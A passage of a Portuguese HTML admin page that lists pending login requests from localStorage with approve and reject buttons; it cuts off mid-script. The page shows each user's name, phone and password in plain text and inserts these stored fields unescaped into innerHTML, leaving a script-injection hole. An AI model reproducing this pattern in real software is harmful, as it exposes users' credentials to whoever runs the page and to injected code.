<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Administração - Aprovação</title>
<style>
body{font-family:'Inter',sans-serif;background:linear-gradient(135deg,#f7f7f7,#e3f0ff);margin:0;padding:0;display:flex;justify-content:center;}
.container{background:white;margin-top:50px;padding:30px;border-radius:20px;box-shadow:0 15px 30px rgba(0,0,0,0.15);width:450px;}
h2{text-align:center;color:#25d366;margin-bottom:20px;}
.pedido{display:flex;justify-content:space-between;align-items:center;padding:10px 15px;margin:10px 0;border-radius:12px;background:#f0f0f0;}
.pedido img{border-radius:50%;width:40px;margin-right:10px;}
button{padding:6px 12px;border:none;border-radius:10px;cursor:pointer;font-weight:600;transition:0.3s;margin-left:5px;}
button.aceitar{background:#25d366;color:white;}button.aceitar:hover{background:#1ebe5b;transform:scale(1.05);}
button.rejeitar{background:#ff4c4c;color:white;}button.rejeitar:hover{background:#e03b3b;transform:scale(1.05);}
</style>
</head>
<body>
<div class="container">
<h2>Pedidos de Login</h2>
<div id="listaPedidos"></div>
</div>
<script>
function carregarPedidos(){
  const container=document.getElementById('listaPedidos');container.innerHTML='';
  let pedidos=JSON.parse(localStorage.getItem("pedidosLogin"))||[];
  if(pedidos.filter(p=>p.status==="pendente").length===0){container.innerHTML="<p style='text-align:center;color:#555;'>Nenhum pedido pendente</p>";return;}
  pedidos.forEach((p,index)=>{
    if(p.status==="pendente"){
      const div=document.createElement("div");div.className="pedido";
      div.innerHTML=`<div style="display:flex;align-items:center;"><img src="${p.foto||'icon-192.png'}"><span>${p.nome} | ${p.telefone} | ${p.senha}</span></div>`;
      const aceitar=document.createElement("button");aceitar.className="aceitar";aceitar.textContent="Aceitar";aceitar.onclick=()=>{pedidos[index].status="aprovado";localStorage.setItem
